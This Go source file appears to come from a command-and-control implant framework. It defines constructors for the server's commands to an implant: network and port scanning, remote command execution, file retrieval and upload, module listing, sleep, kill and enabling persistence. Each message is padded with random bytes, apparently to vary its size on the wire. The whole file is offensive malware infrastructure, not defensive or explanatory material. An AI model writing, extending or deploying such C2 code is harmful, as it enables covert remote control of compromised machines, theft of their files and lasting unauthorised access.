package messages

import "math/rand"

/**
Creating actual structs for protobuf in go is really ugly,
 these are just functions that abstract the creation process away
*/

func C2_wrap(message isCheckCmdReply_Message) *CheckCmdReply {
	bytes := make([]byte, rand.Intn(100)+1) // Make a buffer of len 1-100
	rand.Read(bytes)                        // Fill with random data

	return &CheckCmdReply{Message: message, RandomPadding: bytes}
}

func C2_heartbeat(heartbeat int64) *CheckCmdReply {
	return C2_wrap(&CheckCmdReply_Heartbeat{Heartbeat: heartbeat})
}

func C2_ipscan_range(iprange string) *CheckCmdReply {
	ipscan := &IPScan{IpRange: iprange}
	return C2_wrap(&CheckCmdReply_IpScan{IpScan: ipscan})
}

func C2_ipscan_cancel() *CheckCmdReply {
	ipscan := &IPScan{Cancel: true}
	return C2_wrap(&CheckCmdReply_IpScan{IpScan: ipscan})
}

func C2_portscan_range(ip string, start uint32, end uint32) *CheckCmdReply {
	portscan := &PortScan{Ip: ip, StartPort: start, EndPort: end}
	return C2_wrap(&CheckCmdReply_Portscan{Portscan: portscan})
}

func C2_portscan_cancel() *CheckCmdReply {
	portscan := &PortScan{Cancel: true}
	return C2_wrap(&CheckCmdReply_Portscan{Portscan: portscan})
}

func C2_exec(cmdname string, args []string) *CheckCmdReply {
	exec := &Exec{Exec: cmdname, Args: args}
	return C2_wrap(&CheckCmdReply_Exec{Exec: exec})
}

func C2_getfile(filename string) *CheckCmdReply {
	getfile := &GetFile{Filename: filename}
	return C2_wrap(&CheckCmdReply_Getfile{Getfile: getfile})
}

func C2_uploadfile(filename string, file_contents []byte) *CheckCmdReply {
	putfile := &UploadFile{Filename: filename, Contents: file_contents}
	return C2_wrap(&CheckCmdReply_Uploadfile{Uploadfile: putfile})
}

func C2_listmodules() *CheckCmdReply {
	return C2_wrap(&CheckCmdReply_Listmodules{Listmodules: true})
}

func C2_kill() *CheckCmdReply {
	return C2_wrap(&CheckCmdReply_Kill{Kill: true})
}

func C2_sleep(time int64) *CheckCmdReply {
	return C2_wrap(&CheckCmdReply_Sleep{Sleep: time})
}

func C2_persistence(status bool) *CheckCmdReply {
	return C2_wrap(&CheckCmdReply_Persistence{Enable: status})
}
